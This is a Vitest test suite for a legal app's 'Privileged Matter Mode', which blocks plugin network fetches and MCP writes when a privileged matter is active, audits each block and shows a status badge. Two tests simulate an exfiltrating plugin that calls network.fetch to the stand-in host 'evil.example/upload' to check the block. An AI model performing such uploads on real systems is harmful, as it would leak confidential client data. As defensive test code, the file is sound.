/**
 * Privileged Matter Mode: the exfiltration guardrail for network-capable
 * extensions (network-permissioned plugins + MCP servers).
 *
 * These tests pin the guardrail's load-bearing behaviour:
 *   1. resolvePrivilegedMatterMode(): the manual toggle OR'd with the auto-on
 *      triggers (privileged active matter, Local-only), and the "forced" flag.
 *   2. PluginAPIBridge: a `network.fetch` call is REJECTED when the gate says
 *      the mode is on, and ALLOWED when off; the denial reuses the
 *      permission-denied path (hook fires, worker gets `permission-denied`).
 *   3. A non-network plugin call still works while the mode is on (usable, not
 *      all-or-nothing).
 *   4. The block is AUDITED (via PluginPermissions composing onPermissionDenied)
 *      with permission='network' and the privileged-matter reason.
 *   5. McpApprovalModal: MCP is disabled in the mode: pending writes are
 *      auto-denied, never approvable, the disabled banner renders, and each
 *      block fires the audit callback.
 *   6. The status-bar badge renders when the mode is active.
 *   7. Auto-on fires for a privileged active matter (end-to-end through the
 *      stores + the reactive hook).
 *   8. No em dashes in the new user-facing copy.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen, waitFor } from '@testing-library/react';

import {
  PluginAPIBridge,
  type PluginBridgeHooks,
  type PluginWorkerLike,
} from '@/modules/plugins/PluginAPIBridge';
import { decode, encode, type PluginMessage } from '@/modules/plugins/PluginMessageProtocol';
import { PluginPermissions } from '@/modules/plugins/PluginPermissions';
import { AuditService } from '@/modules/audit/AuditService';
import { fakeManifest } from '../../helpers/pluginMockFactory';

import {
  resolvePrivilegedMatterMode,
  PRIVILEGED_MATTER_BLOCK_REASON,
  PRIVILEGED_MATTER_MODE_SETTING_KEY,
} from '@/modules/privacy/privilegedMatterMode';
import {
  usePrivilegedMatterMode,
  getPrivilegedMatterModeActive,
} from '@/hooks/usePrivilegedMatterMode';
import { useSettingsStore } from '@/stores/settingsStore';
import { useMatterStore } from '@/stores/matterStore';
import { CONFIDENTIALITY_MODE_SETTING_KEY } from '@/modules/privacy/egress';
import { McpApprovalModal } from '@/components/settings/McpApprovalModal';
import type { McpPendingApproval } from '@/utils/tauri-commands';
import { StatusBar } from '@/components/layout/StatusBar';
import { useWorkspaceStore } from '@/stores/workspaceStore';

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

/** Stand-alone mock worker so we can drive bridge messages directly. */
function makeStandaloneWorker(): {
  worker: PluginWorkerLike;
  posted: PluginMessage[];
} {
  const posted: PluginMessage[] = [];
  const worker: PluginWorkerLike = {
    postMessage(data) {
      try {
        posted.push(decode(data));
      } catch {
        /* skip malformed */
      }
    },
    terminate() {},
    addEventListener() {},
    removeEventListener() {},
  };
  return { worker, posted };
}

function makeApproval(over: Partial<McpPendingApproval> = {}): McpPendingApproval {
  return {
    token: over.token ?? 'abc123',
    path: over.path ?? 'notes/secret.md',
    preview: over.preview ?? 'new content',
    fileExists: over.fileExists ?? false,
    oldPreview: over.oldPreview ?? '',
    contentBytes: over.contentBytes ?? 11,
    receivedAt: over.receivedAt ?? 1,
  };
}

beforeEach(() => {
  globalThis.localStorage.clear();
  useSettingsStore.setState({ values: {} });
  useMatterStore.setState({ matters: [], activeMatterId: null });
});

// ---------------------------------------------------------------------------
// 1. Pure resolver
// ---------------------------------------------------------------------------

describe('resolvePrivilegedMatterMode', () => {
  it('is off when nothing forces it and the manual toggle is off', () => {
    const r = resolvePrivilegedMatterMode({
      manual: false,
      activeMatterPrivileged: false,
      confidentialityMode: 'direct',
    });
    expect(r.active).toBe(false);
    expect(r.trigger).toBe('off');
    expect(r.forced).toBe(false);
  });

  it('is on (not forced) when only the manual toggle is set', () => {
    const r = resolvePrivilegedMatterMode({
      manual: true,
      activeMatterPrivileged: false,
      confidentialityMode: 'direct',
    });
    expect(r.active).toBe(true);
    expect(r.trigger).toBe('manual');
    expect(r.forced).toBe(false);
  });

  it('is forced on when the active matter is privileged, even with manual off', () => {
    const r = resolvePrivilegedMatterMode({
      manual: false,
      activeMatterPrivileged: true,
      confidentialityMode: 'direct',
    });
    expect(r.active).toBe(true);
    expect(r.trigger).toBe('privileged-matter');
    expect(r.forced).toBe(true);
  });

  it('is forced on in Local-only mode', () => {
    const r = resolvePrivilegedMatterMode({
      manual: false,
      activeMatterPrivileged: false,
      confidentialityMode: 'local-only',
    });
    expect(r.active).toBe(true);
    expect(r.trigger).toBe('local-only');
    expect(r.forced).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 2 + 3 + 4. PluginAPIBridge network gate + non-network passthrough + audit
// ---------------------------------------------------------------------------

describe('PluginAPIBridge: Privileged Matter Mode network gate', () => {
  it('rejects a network.fetch call when the gate is on, even with the network permission granted', async () => {
    const { worker, posted } = makeStandaloneWorker();
    const onPermissionDenied = vi.fn();
    const dispatch = vi.fn(async () => ({ ok: true }));
    const hooks: PluginBridgeHooks = {
      dispatch,
      onPermissionDenied,
      isNetworkEgressBlocked: () => true,
    };
    const bridge = new PluginAPIBridge(
      fakeManifest({ id: 'exfil', permissions: ['network'] }),
      hooks,
      () => worker,
    );

    await bridge.handleApiCall({
      id: 'n-1',
      type: 'api-call',
      method: 'network.fetch',
      args: ['https://evil.example/upload'],
    });

    // Dispatch (the real fetch) must never run.
    expect(dispatch).not.toHaveBeenCalled();
    // The permission-denied hook fired with the network permission + reason.
    expect(onPermissionDenied).toHaveBeenCalledWith({
      permission: 'network',
      method: 'network.fetch',
      reason: 'privileged-matter-mode',
    });
    // The worker received a permission-denied error carrying the reason copy.
    const err = posted.find((m) => m.type === 'error');
    expect(err?.type === 'error' && err.error.code).toBe('permission-denied');
    if (err?.type === 'error') {
      expect(err.error.message).toContain(PRIVILEGED_MATTER_BLOCK_REASON);
    }
  });

  it('ALLOWS a network.fetch call when the gate is off (granted permission)', async () => {
    const { worker, posted } = makeStandaloneWorker();
    const dispatch = vi.fn(async () => ({ status: 200 }));
    const bridge = new PluginAPIBridge(
      fakeManifest({ id: 'net-ok', permissions: ['network'] }),
      { dispatch, isNetworkEgressBlocked: () => false },
      () => worker,
    );

    await bridge.handleApiCall({
      id: 'n-2',
      type: 'api-call',
      method: 'network.fetch',
      args: ['https://api.example/data'],
    });

    expect(dispatch).toHaveBeenCalledOnce();
    expect(posted.some((m) => m.type === 'api-result')).toBe(true);
    expect(posted.some((m) => m.type === 'error')).toBe(false);
  });

  it('allows a NON-network plugin call while the gate is on (usable, not all-or-nothing)', async () => {
    const { worker, posted } = makeStandaloneWorker();
    const dispatch = vi.fn(async () => 'file body');
    const bridge = new PluginAPIBridge(
      fakeManifest({ id: 'reader', permissions: ['workspace:read'] }),
      { dispatch, isNetworkEgressBlocked: () => true },
      () => worker,
    );

    await bridge.handleApiCall({
      id: 'w-1',
      type: 'api-call',
      method: 'workspace.readFile',
      args: ['/notes.md'],
    });

    // The mode does not touch non-network methods.
    expect(dispatch).toHaveBeenCalledOnce();
    const result = posted.find((m) => m.type === 'api-result');
    expect(result?.type === 'api-result' && result.result).toBe('file body');
  });

  it('audits the network block as plugin_permission_denied with the privileged-matter reason', async () => {
    const { worker } = makeStandaloneWorker();
    const audit = new AuditService('plugins');
    const appendSpy = vi.spyOn(audit, 'append');
    const perms = new PluginPermissions(
      fakeManifest({ id: 'exfil2', permissions: ['network'] }),
      audit,
    );
    // Compose the audit hook onto the bridge hooks, exactly as PluginManager does.
    const hooks = perms.composeHooks({ isNetworkEgressBlocked: () => true, dispatch: vi.fn() });
    const bridge = new PluginAPIBridge(
      fakeManifest({ id: 'exfil2', permissions: ['network'] }),
      hooks,
      () => worker,
    );

    await bridge.handleApiCall({
      id: 'n-3',
      type: 'api-call',
      method: 'network.fetch',
      args: ['https://evil.example'],
    });

    const event = appendSpy.mock.calls
      .map((c) => c[0])
      .find((e) => e.type === 'plugin_permission_denied');
    expect(event).toBeDefined();
    if (event?.type === 'plugin_permission_denied') {
      expect(event.payload.permission).toBe('network');
      expect(event.payload.apiCall).toBe('network.fetch');
      expect(event.payload.reason).toBe('privileged-matter-mode');
    }
  });

  it('with no gate wired, network.fetch behaves normally (no extra restriction)', async () => {
    const { worker, posted } = makeStandaloneWorker();
    const dispatch = vi.fn(async () => ({ status: 200 }));
    const bridge = new PluginAPIBridge(
      fakeManifest({ id: 'net-default', permissions: ['network'] }),
      { dispatch },
      () => worker,
    );

    await bridge.handleApiCall({
      id: 'n-4',
      type: 'api-call',
      method: 'network.fetch',
      args: ['https://api.example'],
    });

    expect(dispatch).toHaveBeenCalledOnce();
    expect(posted.some((m) => m.type === 'error')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 5. MCP disabled in the mode
// ---------------------------------------------------------------------------

describe('McpApprovalModal: disabled in Privileged Matter Mode', () => {
  it('auto-denies every pending write, never offers approve, shows the banner, and audits', async () => {
    const onRespond = vi.fn(async () => {});
    const onMcpBlocked = vi.fn();

    render(
      <McpApprovalModal
        approvals={[makeApproval({ token: 'tok1', path: 'matter/secret.md' })]}
        onRespond={onRespond}
        onApproveAllSession={() => {}}
        privilegedMatterMode
        onMcpBlocked={onMcpBlocked}
      />,
    );

    // Auto-denied (approved=false) and audited.
    await waitFor(() => {
      expect(onRespond).toHaveBeenCalledWith('tok1', false);
    });
    expect(onMcpBlocked).toHaveBeenCalledWith('matter/secret.md');

    // The disabled banner shows and there is NO approve button.
    expect(screen.getByTestId('mcp-approval-blocked-banner')).toBeInTheDocument();
    expect(screen.queryByTestId('mcp-approve-write')).not.toBeInTheDocument();
    expect(screen.queryByTestId('mcp-approve-all-session')).not.toBeInTheDocument();
  });

  it('does NOT auto-deny when the mode is off (normal approval flow shows the approve button)', () => {
    const onRespond = vi.fn(async () => {});
    render(
      <McpApprovalModal
        approvals={[makeApproval({ token: 'tok2' })]}
        onRespond={onRespond}
        privilegedMatterMode={false}
      />,
    );
    expect(onRespond).not.toHaveBeenCalled();
    expect(screen.getByTestId('mcp-approve-write')).toBeInTheDocument();
  });
});

// ---------------------------------------------------------------------------
// 6 + 7. Status-bar badge + auto-on for a privileged active matter
// ---------------------------------------------------------------------------

/** A tiny probe component that surfaces the reactive hook for assertions. */
function ModeProbe() {
  const mode = usePrivilegedMatterMode();
  return (
    <div
      data-testid="probe"
      data-active={mode.active ? 'true' : 'false'}
      data-forced={mode.forced ? 'true' : 'false'}
      data-trigger={mode.trigger}
    />
  );
}

describe('Privileged Matter Mode activation (reactive hook + stores)', () => {
  it('is off by default', () => {
    render(<ModeProbe />);
    expect(screen.getByTestId('probe').getAttribute('data-active')).toBe('false');
  });

  it('turns on automatically when the active matter is privileged', () => {
    const matter = useMatterStore.getState().createMatter({
      name: 'Acme v. Beta',
      client: 'Acme',
      privileged: true,
    });
    useMatterStore.getState().setActiveMatter(matter.id);

    render(<ModeProbe />);
    const probe = screen.getByTestId('probe');
    expect(probe.getAttribute('data-active')).toBe('true');
    expect(probe.getAttribute('data-forced')).toBe('true');
    expect(probe.getAttribute('data-trigger')).toBe('privileged-matter');
  });

  it('turns on automatically in Local-only confidentiality mode', () => {
    useSettingsStore.getState().setSetting(CONFIDENTIALITY_MODE_SETTING_KEY, 'local-only');
    render(<ModeProbe />);
    expect(screen.getByTestId('probe').getAttribute('data-trigger')).toBe('local-only');
  });

  it('the non-reactive read agrees with the reactive resolver (privileged active matter)', () => {
    const matter = useMatterStore.getState().createMatter({
      name: 'M', client: 'C', privileged: true,
    });
    useMatterStore.getState().setActiveMatter(matter.id);
    expect(getPrivilegedMatterModeActive()).toBe(true);
  });

  it('manual toggle alone activates it (non-reactive read)', () => {
    useSettingsStore.getState().setSetting(PRIVILEGED_MATTER_MODE_SETTING_KEY, true);
    expect(getPrivilegedMatterModeActive()).toBe(true);
  });
});

describe('StatusBar: Privileged Matter Mode badge', () => {
  it('renders the persistent badge when the mode is active', () => {
    useSettingsStore.getState().setSetting(PRIVILEGED_MATTER_MODE_SETTING_KEY, true);
    render(<StatusBar />);
    const badge = screen.getByTestId('privileged-matter-badge');
    expect(badge).toBeInTheDocument();
    // F-104: badge copy updated to plain English describing what the mode does
    expect(badge.textContent).toContain('outside connections are blocked');
  });

  it('does not render the badge when the mode is off', () => {
    useWorkspaceStore.setState({ rootPath: null });
    render(<StatusBar />);
    expect(screen.queryByTestId('privileged-matter-badge')).not.toBeInTheDocument();
  });
});

// ---------------------------------------------------------------------------
// 8. No em dashes in the new copy
// ---------------------------------------------------------------------------

describe('copy hygiene', () => {
  it('the block reason contains no em dash', () => {
    expect(PRIVILEGED_MATTER_BLOCK_REASON.includes('—')).toBe(false);
  });
});
